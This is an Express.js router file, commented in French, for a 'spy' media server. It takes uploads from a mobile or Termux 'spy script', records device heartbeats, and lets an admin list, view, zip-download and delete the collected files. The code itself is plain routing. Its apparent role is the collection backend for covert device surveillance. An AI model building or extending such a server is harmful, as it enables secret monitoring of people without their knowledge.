const express = require('express');
const router = express.Router();
const multer = require('multer');
const path = require('path');
const fs = require('fs');
const config = require('../config');
const SpyController = require('../controllers/spyController');
const spyAuth = require('../middleware/spyAuth');

// Ensure upload directory
if (!fs.existsSync(config.spy.dir)) {
  fs.mkdirSync(config.spy.dir, { recursive: true });
}

// Multer storage for spy media
const storage = multer.diskStorage({
  destination: (req, file, cb) => {
    cb(null, config.spy.dir);
  },
  filename: (req, file, cb) => {
    const ext = path.extname(file.originalname) || '.jpg';
    const uniqueSuffix = Date.now() + '-' + Math.round(Math.random() * 1e9);
    cb(null, 'spy_' + uniqueSuffix + ext);
  }
});

const upload = multer({
  storage,
  limits: { fileSize: 200 * 1024 * 1024 } // 200MB max per file
});

// Middleware accepting 'file' or 'image' field
const uploadMiddleware = (req, res, next) => {
  upload.single('file')(req, res, (err) => {
    if (err) return next(err);
    if (!req.file) {
      // Try 'image' field as fallback (like in spy.js)
      upload.single('image')(req, res, next);
    } else {
      next();
    }
  });
};

// --- ROUTES ---

// Public : Dashboard HTML page (contient son propre formulaire d'authentification)
router.get('/dashboard', SpyController.getDashboard);

// Public : Authentification administrateur Spy
router.post('/login', SpyController.adminLogin);

// Protégé : Upload média (mobile ou Termux / spy script avec token ou secret)
router.post('/upload', spyAuth, uploadMiddleware, SpyController.uploadMedia);

// Protégé : Liste des fichiers avec filtrage et tris
router.get('/files', spyAuth, SpyController.getFiles);

// Protégé : Fichier individuel (accepte token en query string pour affichage dans balises <img>/<video>)
router.get('/files/:name', spyAuth, SpyController.getFile);

// Protégé : Téléchargement complet ZIP (accepte token en query string)
router.get('/download-all', spyAuth, SpyController.downloadAll);

// Protégé : Suppression de média
router.delete('/files/:name', spyAuth, SpyController.deleteFile);

// Protégé : Statistiques et volume
router.get('/stats', spyAuth, SpyController.getStats);

// Protégé : Heartbeat de l'appareil
router.post('/heartbeat', spyAuth, SpyController.heartbeat);

module.exports = router;
